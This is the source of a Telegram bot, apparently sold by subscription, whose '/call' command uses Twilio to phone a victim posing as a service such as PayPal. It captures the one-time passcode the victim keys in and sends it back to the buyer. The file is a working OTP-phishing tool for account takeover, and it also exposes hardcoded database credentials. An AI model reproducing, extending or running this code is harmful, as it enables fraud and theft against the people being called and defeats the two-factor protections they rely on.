from telegram import *
from telegram.ext import *
from pymongo import MongoClient
from twilio.rest import Client
from datetime import datetime
import os
import time
import pymongo
import json
with open("config.json", "r") as jsonfile:
    data = json.load(jsonfile)
    account_sid = data['twiliosid']
    auth_token = data['twilioauth']
    ngrok = data['ngrok']


tclient = Client(account_sid, auth_token)


cluster = MongoClient("mongodb+srv://TOP:TOPSMS@bot.kqphwt1.mongodb.net/?retryWrites=true&w=majority")
db = cluster["users"]
collection = db["users"]

def checkdate(chatid):
    cursor = collection.find({'chat_id': f'{chatid}'})
    for doc in cursor:
        duration = doc['duration']
        if duration == "1Day":

            expirationhour = doc['expirationdate']
            hh = int(str(expirationhour).split(':')[0])
            mm = int(str(expirationhour).split(':')[1])
            ss = int(str(expirationhour).split(':')[2])
            formula = int(hh) * 3600 + int(mm) * 60 + ss
            now = datetime.now().strftime("%H:%M:%S")
            nowhh = now.split(':')[0]
            nowmm = now.split(':')[1]
            nowss = now.split(':')[2]
            formula1 = int(nowhh) * 3600 + int(nowmm) * 60 + int(nowss)
            if formula - formula1 >= 0:
                return True
                print(formula1 - formula)

            else:
                
                return False
        elif duration == "1Week":
            expirationdate = doc['expirationdate']
            dd = int(str(expirationdate).split('/')[0])
            m = int(str(expirationdate).split('/')[1])
            yy = int(str(expirationdate).split('/')[2])
            formula = int(yy) + int(m) + dd
            noww = datetime.now().strftime('%d/%m/%Y')
            nowdd = int(str(noww).split('/')[0])
            nowm = int(str(noww).split('/')[1])
            nowyy = int(str(noww).split('/')[2])

            formula1 = int(nowyy) + int(nowm) + int(nowdd)
            dt1 = datetime(yy,m,dd)
            dt2 = datetime(yy,nowm,nowdd)
            tdelta = dt2 - dt1 
            if str(tdelta) == "7 days, 0:00:00":
                print(tdelta)
            elif str(tdelta) == '0:00:00':
                return True
            elif '-' in str(tdelta):
                return False 
            else:
                return True
        elif duration == "1Month":
            expirationdate = doc['expirationdate']
            dd = int(str(expirationdate).split('/')[0])
            m = int(str(expirationdate).split('/')[1])
            yy = int(str(expirationdate).split('/')[2])
            formula = int(yy) + int(m) + dd
            noww = datetime.now().strftime('%d/%m/%Y')
            nowdd = int(str(noww).split('/')[0])
            nowm = int(str(noww).split('/')[1])
            nowyy = int(str(noww).split('/')[2])

            formula1 = int(nowyy) + int(nowm) + int(nowdd)
            dt1 = datetime(yy,m,dd)
            dt2 = datetime(yy,nowm,nowdd)
            tdelta = dt2 - dt1 
            if str(tdelta) == "30 days, 0:00:00":
                print(tdelta)
            elif str(tdelta) == '0:00:00':
                return True
            elif '-' in str(tdelta):
                return False 
            else:
                return True
        elif duration == "1Year":
            expirationdate = doc['expirationdate']
            dd = int(str(expirationdate).split('/')[0])
            m = int(str(expirationdate).split('/')[1])
            yy = int(str(expirationdate).split('/')[2])
            formula = int(yy) + int(m) + dd
            noww = datetime.now().strftime('%d/%m/%Y')
            nowdd = int(str(noww).split('/')[0])
            nowm = int(str(noww).split('/')[1])
            nowyy = int(str(noww).split('/')[2])

            formula1 = int(nowyy) + int(nowm) + int(nowdd)
            dt1 = datetime(yy,m,dd)
            dt2 = datetime(yy,nowm,nowdd)
            tdelta = dt2 - dt1 
            if str(tdelta) == "365 days, 0:00:00":
                print(tdelta)
            elif str(tdelta) == '0:00:00':
                return True
            elif '-' in str(tdelta):
                return False 
            else:
                return True
        elif duration == "Permanent":
            return True
        else:
            return False





def call(update:Update, context:CallbackContext):
    if checkdate(chatid=update.effective_chat.id) == True:

        try:
            phonenumber = str(context.args[0])
            digits = str(context.args[1])
            service = str(context.args[2])
            context.bot.send_message(chat_id=update.message.chat_id, text=f'☎️ Calling {phonenumber} from +18155510268 \nStatus: Accepted ✅ \nPhone: +1{phonenumber} \nDigits: {digits} \nService: {service}')
            open(f'{os.getcwd()}/Extra/chatid.txt', 'w').write(f'{update.effective_chat.id}')
            open(f'{os.getcwd()}/Extra/otp.txt', 'w').write(f'')
            open(f'{os.getcwd()}/Extra/Digits.txt', 'w').write(f'{digits}')
            open(f'{os.getcwd()}/Extra/CompanyName.txt', 'w').write(f'{service}')
            call = tclient.calls.create(
                url=f'{ngrok}/voice',
                to=f'{phonenumber}',
                from_=f'+18155510268',
            )
            sid = call.sid
            print(sid)
            a = 0
            b = 0
            c = 0
            d = 0
            while True:
                if tclient.calls(sid).fetch().status == 'queued':
                    if not a >= 1:
                        context.bot.send_message(chat_id=update.message.chat_id, text=f'📱Queued')
                    
                        a = a + 1
                elif tclient.calls(sid).fetch().status == 'ringing':
                    if not b >= 1:
                        context.bot.send_message(chat_id=update.message.chat_id, text=f'📱Ringing')

                        b = b + 1
                elif tclient.calls(sid).fetch().status == 'in-progress':
                    if not c >= 1:
                        context.bot.send_message(chat_id=update.message.chat_id, text=f'📲In Progress')

                        c = c + 1
                elif tclient.calls(sid).fetch().status == 'completed':
                        context.bot.send_message(chat_id=update.message.chat_id, text=f'☎️ Call Completed \nThanks for using our bot <3')
                        break
                elif tclient.calls(sid).fetch().status == 'failed':
                    context.bot.send_message(chat_id=update.message.chat_id, text=f'☎️ Call Failed\nThanks for using our bot <3')

                    break
                elif tclient.calls(sid).fetch().status == 'no-answer':
                    context.bot.send_message(chat_id=update.message.chat_id, text=f'☎️ Call Not Answered\nThanks for using our bot <3')

                    break
                elif tclient.calls(sid).fetch().status == 'canceled':
                    context.bot.send_message(chat_id=update.message.chat_id, text=f'☎️ Call Cancelled\nThanks for using our bot <3')

                    break
                elif tclient.calls(sid).fetch().status == 'busy':
                    context.bot.send_message(chat_id=update.message.chat_id, text=f'📲 Line Busy :(\nThanks for using our bot <3')

                    break
            time.sleep(1)
            otp = open(f'Extra/otp.txt', 'r').read()
            call1 = tclient.calls(sid).fetch()
            if otp == '':
                context.bot.send_message(chat_id=update.message.chat_id, text=f'<b>Status: Failed\n📱No OTP gived!\nDuration : {call1.duration} secs</b>', parse_mode='html')
                context.bot.send_message(chat_id=update.message.chat_id, text=f'<b>Thanks for using our bot!</b>', parse_mode='html')


            else:
                context.bot.send_message(chat_id=update.message.chat_id, text=f'<b>Status: Sucess</b>\n📲<b>OTP Code: </b><code>{otp}</code>\n<b>Duration : {call1.duration} secs</b>', parse_mode='html')
                context.bot.send_message(chat_id=update.message.chat_id, text=f'<b>Thanks for using our bot! 💖 </b>', parse_mode='html')




        except (IndexError, ValueError):
            update.message.reply_text('⚠️ Invalid args gived please give args like "<code>/call 111-111-111 6 paypal</code>" where 6 are the digits and paypal is the service you want to join!', parse_mode="html")
    else:
        context.bot.send_message(chat_id=update.message.chat_id, text="<b>⛔ You don't have access to this command, to use it please buy the access to the command using </b><code>/buy</code> ⛔", parse_mode='html')
